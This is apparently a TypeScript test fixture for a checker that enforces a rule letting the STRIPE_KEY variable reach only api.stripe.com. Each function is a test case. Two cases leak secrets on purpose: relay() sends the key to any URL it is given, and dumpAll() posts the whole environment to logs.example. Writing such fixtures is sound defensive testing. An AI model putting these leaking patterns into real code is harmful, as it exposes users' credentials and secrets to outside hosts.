// Used by test/flows.test.ts, with the rule: env(STRIPE_KEY) may only go to net(api.stripe.com).

/** @perm env(STRIPE_KEY), net(api.stripe.com), net(analytics.example) */
export async function charge(amount: number) {
  const key = process.env.STRIPE_KEY;
  await fetch("https://api.stripe.com/v1/charges", { method: "POST", headers: { authorization: `Bearer ${key}` } });
  await track(amount);
}

function track(amount: number) {
  return fetch("https://analytics.example/event", { method: "POST", body: String(amount) });
}

/** Reads the key and sends to whatever URL it's given. */
export async function relay(url: string) {
  const key = process.env.STRIPE_KEY;
  return fetch(url, { headers: { key: key ?? "" } });
}

/** Sends the whole environment, the key included. */
export async function dumpAll() {
  return fetch("https://logs.example/env", { method: "POST", body: JSON.stringify(process.env) });
}

/** Only ever talks to Stripe: allowed. */
export async function stripeOnly() {
  const key = process.env.STRIPE_KEY;
  return fetch("https://api.stripe.com/v1/balance", { headers: { authorization: `Bearer ${key}` } });
}

/** Reads a different variable: the rule doesn't apply. */
export async function other() {
  const token = process.env.OTHER_TOKEN;
  return fetch("https://analytics.example/event", { headers: { token: token ?? "" } });
}

/** Calls a function that uses the key, but never has the key itself: not flagged. */
export async function dashboard() {
  await stripeOnly();
  return fetch("https://analytics.example/view");
}
